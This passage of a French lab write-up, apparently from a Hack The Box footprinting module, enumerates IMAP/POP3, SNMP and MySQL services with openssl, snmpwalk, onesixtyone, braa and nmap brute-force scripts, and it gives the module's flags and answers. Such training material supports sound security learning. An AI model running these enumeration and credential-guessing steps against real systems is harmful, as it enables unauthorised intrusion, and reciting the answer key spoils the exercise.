**Réponse :** `HTB{roncfbw7iszerd7shni7jr2343zhrj}`

**What is the customized version of the POP3 server?**

Pour savoir la version custom utilisé il faut se connecter en premier ou faire un nmap ou encore un telnet mais là nous allons utiliser la commande `openssl` apprise fraichement

```bash
└──╼ [★]$ openssl s_client -connect 10.129.65.62:995
```

Ca met énormément d'information donc je ne vous met pas tout ça mais à la fin ça nous met ceci

```bash
---
read R BLOCK
+OK InFreight POP3 v9.188
```

**Réponse :** `InFreight POP3 v9.188`

**What is the admin email address?**

Pour obtenir ceci nous allons devoir nous servir de commandes directement dans `openssl`

```bash
openssl s_client -connect 10.129.65.62:imaps
```

Puis nous devons nous connecter en tant que `robin`

```bash
a login robin robin
```

> Attention il faut toujours mettre un `a` ou un `b` ou juste une lettre devant la commande qu'on veut faire pour que ça interprète bien notre commande sinon ça n'est pas reconnu
{: .prompt-warning}

Ensuite nous pouvons lister les différents contenu comme ceci

```bash
a LIST "" *
* LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." INBOX
a OK List completed (0.001 + 0.000 secs).
```

Nous voyons 4 "dossiers" et notemment **INBOX** que nous allons aller voir

```bash
a SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414280] UIDs valid
* OK [UIDNEXT 1] Predicted next UID
a OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
```

Apparemment **INBOX** est vide donc nous allons voir dans `DEV.DEPARTMENT.INT`

```bash
a SELECT DEV.DEPARTMENT.INT
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636414279] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a OK [READ-WRITE] Select completed (0.004 + 0.000 + 0.003 secs).
```

Et en effet il y a quelque chose qui existe ici ! `1 EXISTS`, Et nous pouvons le voir grâce a la commande suivante

```bash
a FETCH 1 BODY[]
* 1 FETCH (BODY[] {167}
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200

HTB{983uzn8jmfgpd8jmof8c34n7zio}
)
a OK Fetch completed (0.003 + 0.000 + 0.002 secs).
```

Nous avons déjà le `mail admin` mais en plus le flag pour la prochaine question !

**Réponse :** `devadmin@inlanefreight.htb`

**Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**

**Réponse :** `HTB{983uzn8jmfgpd8jmof8c34n7zio}`

---

## SNMP (Simple Network Management Protocol)

### Qu'est-ce que SNMP ?

**SNMP (Simple Network Management Protocol)** est un protocole créé pour surveiller et gérer les équipements réseau à distance. Ce qui m'a surpris, c'est que SNMP ne sert pas uniquement à **monitorer** mais aussi à **modifier des configurations** et **changer des paramètres** sur les équipements.

> **Pour les débutants** : SNMP permet aux administrateurs réseau de surveiller des routeurs, switches, serveurs, et objets IoT depuis une console centralisée, sans avoir à se connecter physiquement à chaque équipement.
{: .prompt-info}

Les équipements compatibles SNMP incluent :
- Routeurs et switches
- Serveurs
- Dispositifs IoT
- Imprimantes réseau
- Et bien d'autres périphériques réseau

La version actuelle est **SNMPv3**, qui améliore considérablement la sécurité mais augmente aussi la complexité d'utilisation.

### Fonctionnement technique

SNMP utilise des **agents** qui communiquent via le **port UDP 161** pour l'échange d'informations et l'envoi de commandes de contrôle. Ce qui est particulier avec SNMP, c'est l'existence des **traps** (port UDP 162).

**Mon observation :** Contrairement aux échanges classiques client-serveur où le client demande toujours l'information, les **SNMP traps** permettent au serveur d'envoyer des notifications au client **sans que celui-ci les demande**. C'est utile pour alerter en temps réel d'événements critiques.

### MIB et OID

Pour que SNMP fonctionne entre différents fabricants et systèmes, deux concepts fondamentaux existent :

**MIB (Management Information Base)** : Un fichier texte qui liste tous les objets SNMP interrogeables d'un équipement dans une hiérarchie d'arbre standardisée. Le MIB est écrit en format **ASN.1** (Abstract Syntax Notation One).

> Le MIB ne contient **pas les données** elles-mêmes, mais explique **où trouver** quelle information et **quel type de données** est retourné.
{: .prompt-info}

**OID (Object Identifier)** : Une séquence de nombres qui identifie de manière unique un nœud dans l'arbre hiérarchique. Plus la chaîne est longue, plus l'information est spécifique.

Exemple d'OID : `.1.3.6.1.2.1.1.4.0`

### Les versions de SNMP

#### SNMPv1

La première version du protocole, encore utilisée dans de nombreux petits réseaux.

**Problèmes critiques :**
- **Aucune authentification intégrée** - N'importe qui sur le réseau peut lire et modifier les données
- **Aucun chiffrement** - Toutes les données transitent en clair

> SNMPv1 est extrêmement vulnérable. Les données et les "community strings" (mots de passe) circulent en texte clair sur le réseau.
{: .prompt-danger}

#### SNMPv2c

La version **v2c** (le "c" signifie "community-based") est toujours largement utilisée aujourd'hui. 

**Mon constat :** En termes de sécurité, SNMPv2c est identique à SNMPv1 - les **community strings** sont toujours envoyées en clair, sans chiffrement. Cette version ajoute simplement des fonctionnalités supplémentaires.

#### SNMPv3

La sécurité a été considérablement renforcée avec :
- Authentification par **nom d'utilisateur et mot de passe**
- **Chiffrement** de la transmission (via clé pré-partagée)

**Le problème :** La complexité augmente énormément, avec beaucoup plus d'options de configuration que v2c. C'est pourquoi de nombreuses organisations continuent d'utiliser SNMPv2c malgré ses failles de sécurité.

### Community Strings

Les **community strings** fonctionnent comme des mots de passe qui déterminent si l'information demandée peut être consultée ou non.

**Ce qui m'inquiète :** Beaucoup d'organisations utilisent encore SNMPv2 car la migration vers SNMPv3 est complexe. Cela crée une situation dangereuse où :
- Les community strings sont envoyées en clair
- Elles peuvent être interceptées sur le réseau
- Les administrateurs évitent la migration par peur de la complexité

> Les community strings par défaut comme "public" et "private" sont encore très courantes. C'est souvent le premier test lors d'un pentest.
{: .prompt-tip}

### Configuration par défaut

J'ai examiné un fichier de configuration SNMP typique :
```bash
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

**Résultat :**
```
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
master  agentx
agentaddress  127.0.0.1,[::1]
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
```

**Mon analyse :**
- `sysContact` révèle une adresse email (utile en OSINT)
- `rocommunity public` signifie que la community string "public" donne un accès en lecture seule
- L'agent écoute sur localhost par défaut (`127.0.0.1`)

### Configurations dangereuses

Certains paramètres de configuration sont particulièrement risqués :

| Paramètre | Danger |
|-----------|--------|
| `rwuser noauth` | Accès complet à l'arbre OID **sans authentification** |
| `rwcommunity <string> <IPv4>` | Accès complet en lecture/écriture depuis n'importe quelle IP |
| `rwcommunity6 <string> <IPv6>` | Même chose mais pour IPv6 |

> Le préfixe "rw" signifie "read-write", donnant des droits de **modification** sur l'équipement. C'est critique si mal configuré.
{: .prompt-danger}

### Énumération avec SNMPwalk

**SNMPwalk** permet d'interroger les OID et de récupérer leurs informations :
```bash
snmpwalk -v2c -c public 10.129.14.128
```

**Résultat (extrait) :**
```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu"
iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
```

**Ce que j'ai appris :**
- L'OID `.1.3.6.1.2.1.1.1.0` révèle la version complète de l'OS
- L'OID `.1.3.6.1.2.1.1.4.0` expose l'**adresse email de contact** : `mrb3n@inlanefreight.htb`
- L'OID `.1.3.6.1.2.1.1.5.0` donne le hostname
- L'OID `.1.3.6.1.2.1.1.6.0` indique la localisation physique

En continuant le scan, j'obtiens une liste complète des **paquets installés** sur le système :
```
iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
```

> Cette information est précieuse pour identifier des versions vulnérables de logiciels et planifier des attaques ciblées.
{: .prompt-warning}

### Brute-force avec OneSixtyOne

Si je ne connais pas la community string, j'utilise **onesixtyone** avec des wordlists :
```bash
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

**Résultat :**
```
Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic
```

**Mon observation :** L'outil teste 3220 community strings différentes et trouve "public" qui fonctionne sur cette cible.

> Dans les grands réseaux, les community strings suivent souvent un pattern (ex: hostname + symbole). On peut créer des wordlists personnalisées avec **crunch** pour cibler ces patterns.
{: .prompt-tip}

### Énumération avec Braa

Une fois la community string connue, j'utilise **braa** pour brute-forcer les OID individuels :
```bash
sudo apt install braa
braa public@10.129.14.128:.1.3.6.*
```

**Résultat :**
```
10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
```

**La syntaxe générale :**
```bash
braa <community_string>@<IP>:.1.3.6.*
```

Le wildcard `*` permet d'énumérer tous les OID sous ce préfixe.

### Points importants à retenir

Lors de l'énumération SNMP, je procède systématiquement ainsi :

1. **Tester les community strings par défaut** ("public", "private")
2. **Utiliser onesixtyone** si les valeurs par défaut échouent
3. **SNMPwalk** pour une énumération complète des OID
4. **Braa** pour cibler des branches spécifiques de l'arbre OID
5. **Analyser les informations sensibles** : emails, versions de logiciels, configurations

> SNMP peut révéler énormément d'informations sur un système : utilisateurs, processus, services installés, configuration réseau, et bien plus. C'est un vecteur d'attaque souvent négligé mais très puissant.
{: .prompt-danger}

Pour approfondir SNMP, consulter :
- [RFC 1157 - SNMPv1](https://www.rfc-editor.org/rfc/rfc1157.html)
- [RFC 1901 - SNMPv2](https://www.rfc-editor.org/rfc/rfc1901.html)
- [RFC 3410 - SNMPv3](https://www.rfc-editor.org/rfc/rfc3410.html)

---

**Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**

Ok nous allons nous servir de l'outil `snmpwalk`

```bash
snmpwalk -v2c -c public 10.129.253.132
```

Bon alors cette commande nous affiche ENORMEMENT d'informations mais une ligne au début nous intéresse:


```bash
iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
```

**Réponse :** `devadmin@inlanefreight.htb`

**What is the customized version of the SNMP server?**

De même dans le long message que ça a affiché on peut y voir jute ne bas de l'email admin cette ligne

```bash
iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
```

**Réponse :** `InFreight SNMP v0.91`

**Enumerate the custom script that is running on the system and submit its output as the answer.**

Toujours dans le même output on y voit bien plus bas cette ligne:

```bash
iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71 = STRING: "/usr/share/flag.sh"
```

Et juste après on aperçoit le contenu : 

```bash
iso.3.6.1.2.1.25.1.7.1.3.1.1.4.70.76.65.71 = STRING: "HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}"
```

**Réponse :** `HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}`

---

## MySQL

### Qu'est-ce que MySQL ?

**MySQL** est un système de gestion de base de données relationnelle (SGBD) SQL open-source développé et supporté par Oracle. Une base de données est simplement une collection structurée de données organisée pour être facilement utilisée et récupérée.

> **Pour les débutants** : MySQL est le moteur qui stocke et gère les données pour de nombreux sites web et applications. C'est comme un gigantesque classeur intelligent qui organise et protège vos informations.
{: .prompt-info}

**Caractéristiques principales :**
- Traitement rapide de grandes quantités de données avec haute performance
- Stockage optimisé pour minimiser l'espace disque
- Contrôle via le langage SQL
- Architecture client-serveur

### Architecture client-serveur

MySQL fonctionne selon le principe **client-serveur** :

**Le serveur MySQL** : Le moteur de base de données qui gère le stockage et la distribution des données. Les données sont stockées dans des tables avec différentes colonnes, lignes et types de données. Ces bases sont souvent sauvegardées dans des fichiers `.sql` (exemple : `wordpress.sql`).

**Les clients MySQL** : Ils récupèrent et modifient les données via des requêtes structurées. Les opérations incluent l'insertion, la suppression, la modification et la récupération de données via le langage SQL.

### Cas d'usage : WordPress et LAMP

L'un des meilleurs exemples d'utilisation de MySQL est le CMS **WordPress**.

**Ce que WordPress stocke dans MySQL :**
- Tous les articles créés
- Noms d'utilisateur et mots de passe
- Commentaires et métadonnées

Par défaut, cette base de données n'est accessible que depuis **localhost**. Cependant, certaines architectures distribuent les bases sur plusieurs serveurs.

**La stack LAMP/LEMP :**

MySQL est idéal pour les applications comme les sites web dynamiques nécessitant syntaxe efficace et vitesse de réponse élevée. On le combine souvent avec :

- **LAMP** : Linux + Apache + MySQL + PHP
- **LEMP** : Linux + Nginx (prononcé "Engine-X") + MySQL + PHP

Dans un hébergement web avec MySQL, la base sert d'**instance centrale** où les scripts PHP stockent le contenu nécessaire.

**Données typiquement stockées :**

| Type de données | Exemples |
|----------------|----------|
| Contenus | En-têtes, textes, meta tags, formulaires |
| Utilisateurs | Clients, noms d'utilisateur, administrateurs, modérateurs |
| Informations sensibles | Adresses email, informations utilisateur, permissions, mots de passe |
| Liens et fichiers | Liens externes/internes, liens vers fichiers, contenus spécifiques |

> **Important** : Les données sensibles comme les mots de passe **peuvent** être stockées en clair par MySQL, mais sont généralement chiffrées au préalable par les scripts PHP via des méthodes sécurisées comme le chiffrement à sens unique (hashing).
{: .prompt-warning}

### MySQL vs MariaDB

**MariaDB** est un fork du code source original de MySQL. Cette séparation s'est produite après l'acquisition de MySQL AB par Oracle, quand le développeur principal de MySQL a quitté l'entreprise pour créer MariaDB comme alternative open-source.

> MariaDB est souvent utilisé comme remplacement compatible de MySQL, avec des commandes et une syntaxe identiques.
{: .prompt-info}

### Configuration par défaut

J'ai examiné la configuration par défaut d'un serveur MySQL :
```bash
sudo apt install mysql-server -y
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

**Résultat :**
```
[client]
port        = 3306
socket      = /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
nice        = 0

[mysqld]
skip-host-cache
skip-name-resolve
user        = mysql
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
port        = 3306
basedir     = /usr
datadir     = /var/lib/mysql
tmpdir      = /tmp
```

**Mon observation :** Par défaut, MySQL écoute sur le **port 3306** et utilise un socket Unix pour les connexions locales.

### Configurations dangereuses

Certains paramètres de configuration présentent des risques de sécurité :

| Paramètre | Risque |
|-----------|--------|
| `user` | Définit l'utilisateur qui exécute MySQL (visible en clair) |
| `password` | Définit le mot de passe pour l'utilisateur MySQL (en clair dans le fichier) |
| `admin_address` | Adresse IP pour les connexions administratives TCP/IP |
| `debug` | Active les logs de débogage détaillés |
| `sql_warnings` | Active les messages d'avertissement détaillés |
| `secure_file_priv` | Limite les opérations d'import/export de données |

**Ce qui m'inquiète :**

Les paramètres `user`, `password` et `admin_address` sont particulièrement critiques car ils sont stockés **en texte clair** dans le fichier de configuration. Si les permissions du fichier sont mal configurées et qu'un attaquant obtient un accès shell, il peut :

1. Lire le fichier de configuration
2. Récupérer les identifiants MySQL
3. Accéder à toute la base de données
4. Voler ou modifier les données clients, emails, mots de passe

> Les paramètres `debug` et `sql_warnings` fournissent des sorties verbales en cas d'erreurs. Ces informations détaillées sont utiles pour l'administrateur mais **ne devraient jamais être visibles** par des utilisateurs externes. Elles peuvent révéler des détails sur la structure de la base et faciliter les injections SQL.
{: .prompt-danger}

### Énumération avec Nmap

MySQL écoute généralement sur le **port TCP 3306**. J'ai scanné un serveur MySQL avec les scripts NSE dédiés :
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

**Résultat :**
```
PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
```

**Mon analyse :**

Les scripts Nmap ont identifié :
- **10 comptes utilisateurs** avec des mots de passe vides
- La **version MySQL** : 8.0.26
- Le serveur accepte des connexions externes

> **ATTENTION** : Les résultats de scripts automatisés peuvent contenir des faux positifs. Toujours vérifier manuellement les découvertes critiques comme les mots de passe vides.
{: .prompt-warning}

### Interaction avec le serveur MySQL

**Test de connexion sans mot de passe :**
```bash
mysql -u root -h 10.129.14.132
```

**Résultat :**
```
ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
```

Dans ce cas, le compte root **nécessite un mot de passe**, contrairement à ce que Nmap avait suggéré.

**Connexion avec mot de passe :**
```bash
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

> **Astuce syntaxe** : Il ne doit **pas** y avoir d'espace entre `-p` et le mot de passe.
{: .prompt-tip}

**Résultat :**
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

MySQL [(none)]>
```

### Commandes MySQL essentielles

Une fois connecté, j'ai exploré la base de données :

**Lister les bases de données :**
```sql
show databases;
```

**Résultat :**
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

**Vérifier la version :**
```sql
select version();
```

**Résultat :**
```
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
```

**Sélectionner une base et lister les tables :**
```sql
use mysql;
show tables;
```

**Résultat (extrait) :**
```
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| db                                                   |
| user                                                 |
| password_history                                     |
...SNIP...
+------------------------------------------------------+
37 rows in set
```

### Bases de données système

**La base `sys` (system schema) :**

Contient des tables, informations et métadonnées nécessaires à la gestion du serveur MySQL.
```sql
use sys;
show tables;
```

**Extraction d'informations utiles :**
```sql
select host, unique_users from host_summary;
```

**Résultat :**
```
+-------------+--------------+                   
| host        | unique_users |                   
+-------------+--------------+                   
| 10.129.14.1 |            1 |                   
| localhost   |            2 |                   
+-------------+--------------+
```

**Mon observation :** Cette requête révèle qu'un utilisateur s'est connecté depuis `10.129.14.1` (connexion externe) et deux utilisateurs depuis localhost. Information précieuse pour identifier des accès suspects.

**La base `information_schema` :**

Base de données contenant des métadonnées, principalement récupérées depuis le system schema. Son existence est due au standard ANSI/ISO.

> La différence : `sys` est un catalogue système Microsoft pour SQL Server avec beaucoup plus d'informations que `information_schema`.
{: .prompt-info}

### Tableau récapitulatif des commandes

| Commande | Description |
|----------|-------------|
| `mysql -u <user> -p<password> -h <IP>` | Connexion au serveur MySQL (pas d'espace entre -p et le password) |
| `show databases;` | Affiche toutes les bases de données |
| `use <database>;` | Sélectionne une base de données existante |
| `show tables;` | Affiche toutes les tables de la base sélectionnée |
| `show columns from <table>;` | Affiche toutes les colonnes d'une table |
| `select * from <table>;` | Affiche tout le contenu d'une table |
| `select * from <table> where <column> = "<string>";` | Recherche dans une table selon un critère |

### Points importants à retenir

Pour devenir efficace avec MySQL en pentest :

1. **Installer sa propre instance** pour expérimenter les configurations
2. **Comprendre la différence** entre les bases système (`sys`, `information_schema`)
3. **Toujours vérifier manuellement** les résultats des scans automatisés
4. **Consulter le manuel de référence** MySQL, notamment la section sur la sécurisation des serveurs
5. **Identifier les bases sensibles** contenant des données critiques

> MySQL expose souvent des informations critiques si mal configuré. Les injections SQL restent une des attaques les plus dévastatrices contre les applications web utilisant MySQL.
{: .prompt-danger}

Pour approfondir MySQL et sa sécurisation, consulter le [MySQL Reference Manual - Security](https://dev.mysql.com/doc/refman/8.0/en/security.html).

---

**Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**

Nous allons déjà procéder a un scan nmap avec le `script mysql`

```bash
└──╼ [★]$ nmap -sC -sV --script mysql* 10.129.205.83
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-25 05:03 CST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 87.50% done; ETC: 05:03 (0:00:03 remaining)
Nmap scan report for 10.129.205.83
Host is up (0.045s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|_    Syntax: EHLO hostname
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp  open  pop3     Dovecot pop3d
143/tcp  open  imap     Dovecot imapd
993/tcp  open  ssl/imap Dovecot imapd
995/tcp  open  ssl/pop3 Dovecot pop3d
3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-enum:
|   Accounts: No valid accounts found
|_  Statistics: Performed 7 guesses in 5 seconds, average tps: 1.4
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, SupportsCompression, Speaks41ProtocolNew, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, LongPassword, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, ODBCClient, FoundRows, InteractiveClient, IgnoreSigpipes, Support41Auth, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: eV\x02\x17XhU&\x08dTbe!^\x14ut][
|_  Auth Plugin Name: caching_sha2_password
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 19722 guesses in 364 seconds, average tps: 46.6
|_  ERROR: The service seems to have failed or is heavily firewalled...
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=11/25%Time=69258D03%P=x86_64-pc-linux-gnu%r(
SF:Hello,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO
SF:\x20hostname\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 397.65 seconds
```

Nous pouvons que mysql est sur le port 3306 donc nous allons faire un scan sur ce port

```bash
sudo nmap -sC -sV -p3306 --script mysql* 10.129.205.83
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-25 05:19 CST
Nmap scan report for 10.129.205.83
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 9 guesses in 5 seconds, average tps: 1.8
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 3871 guesses in 80 seconds, average tps: 46.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 308
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsTransactions, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSigpipes, InteractiveClient, LongPassword, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w\x19D"w\x0C\x1E\x012&9 V\x12\x07E`~-1
|_  Auth Plugin Name: caching_sha2_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.34 seconds
```

**Réponse :** `MySQL 8.0.27`

**During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**

Nous allons nous connecter au service mysql pour aller chercher l'adresse email de `Otto Lang`

```bash
mysql -u robin -probin -h 10.129.205.83
```

> Attention pour les mots de passe a bien coller votre mot de passe au **-p** sinon ça ne fonctionne pas
{: .prompt-warning}

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| customers          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.059 sec)
```

Je pense que l'email est sotcké dans `customers` donc aller y faire un tour

```bash
MySQL [customers]> show tables;
+---------------------+
| Tables_in_customers |
+---------------------+
| myTable             |
+---------------------+
1 row in set (0.045 sec)
```

```bash
MySQL [customers]> select myTable.email from myTable;
+------------------------------------------+
| email                                    |
+------------------------------------------+
| diam.eu@icloud.htb                       |
| tellus.id@google.htb                     |
| lobortis@outlook.htb                     |
| donec@protonmail.htb                     |
| suspendisse.aliquet@yahoo.htb            |
| neque@aol.htb                            |
| eget@google.htb                          |
| non@icloud.htb                           |
| metus@hotmail.htb                        |
| aliquet@yahoo.htb                        |
| ut.nec@yahoo.htb                         |
| bibendum@yahoo.htb                       |
| vulputate.ullamcorper@yahoo.htb          |
| sed.pharetra.felis@yahoo.htb             |
| at.egestas.a@aol.htb                     |
| donec.est@google.htb                     |
| libero@outlook.htb                       |
| nullam.nisl@protonmail.htb               |
| porttitor@aol.htb                        |
| consectetuer.adipiscing.elit@outlook.htb |
| nullam.ut.nisi@protonmail.htb            |
| porttitor.eros@protonmail.htb            |
| at.sem.molestie@icloud.htb               |
| arcu.sed@google.htb                      |
| nam.porttitor@outlook.htb                |
| amet.ornare.lectus@outlook.htb           |
| egestas@google.htb                       |
| iaculis.nec@hotmail.htb                  |
| feugiat.lorem.ipsum@aol.htb              |
| augue.eu@hotmail.htb                     |
| facilisi.sed.neque@aol.htb               |
| penatibus.et@icloud.htb                  |
| neque@outlook.htb                        |
| eleifend.nunc.risus@protonmail.htb       |
| neque.morbi.quis@hotmail.htb             |
| posuere@hotmail.htb                      |
| risus.donec@outlook.htb                  |
| felis.nulla.tempor@icloud.htb            |
| mauris@yahoo.htb                         |
| mauris.a.nunc@yahoo.htb                  |
| diam.proin@protonmail.htb                |
| aliquam.ornare@outlook.htb               |
| tristique@protonmail.htb                 |
| vitae.erat@google.htb                    |
| ultrices@aol.htb                         |
| aliquam.adipiscing.lacus@protonmail.htb  |
| semper.et.lacinia@yahoo.htb              |
| ipsum@google.htb                         |
| aliquet.vel.vulputate@aol.htb            |
| sed.consequat.auctor@yahoo.htb           |
| morbi.sit@icloud.htb                     |
| bibendum.ullamcorper@protonmail.htb      |
| dictum.sapien@google.htb                 |
| nullam.feugiat.placerat@yahoo.htb        |
| gravida.aliquam@aol.htb                  |
| class.aptent@google.htb                  |
| lorem.donec@protonmail.htb               |
| sem.vitae@protonmail.htb                 |
| felis.orci@aol.htb                       |
| a.tortor.nunc@outlook.htb                |
| sapien.gravida.non@outlook.htb           |
| a.sollicitudin@hotmail.htb               |
| urna.justo@outlook.htb                   |
| vivamus.nisi@icloud.htb                  |
| et.eros.proin@icloud.htb                 |
| orci.donec@outlook.htb                   |
| eu.tellus.eu@protonmail.htb              |
| semper@aol.htb                           |
| vehicula.aliquet@icloud.htb              |
| ipsum@aol.htb                            |
| eget.mollis@yahoo.htb                    |
| vitae@yahoo.htb                          |
| quisque@yahoo.htb                        |
| urna.nunc.quis@protonmail.htb            |
| pellentesque.habitant@yahoo.htb          |
| orci.luctus@yahoo.htb                    |
| dolor@yahoo.htb                          |
| sed.et@icloud.htb                        |
| vulputate.nisi@hotmail.htb               |
| ante.lectus@protonmail.htb               |
| nunc@outlook.htb                         |
| libero@aol.htb                           |
| cursus.integer@outlook.htb               |
| ligula@protonmail.htb                    |
| aenean.euismod.mauris@aol.htb            |
| mi.lacinia.mattis@google.htb             |
| tempor.diam@icloud.htb                   |
| ultrices@google.htb                      |
| donec.tempus.lorem@hotmail.htb           |
| eleifend.egestas.sed@outlook.htb         |
| lobortis.tellus.justo@yahoo.htb          |
| cursus.et@google.htb                     |
| ante@hotmail.htb                         |
| aenean@icloud.htb                        |
| eget@aol.htb                             |
| ipsum.suspendisse@protonmail.htb         |
| metus.vitae.velit@yahoo.htb              |
| in.scelerisque.scelerisque@outlook.htb   |
| nulla.cras.eu@outlook.htb                |
+------------------------------------------+
99 rows in set (0.044 sec)
```

Mais il y a trop d'email ici donc nous allons trier le tout

En triant avec `where` il n'y avait rien nous allons regarder plus en profondeur en regardant d'abors la table sur laquel nous sommes:

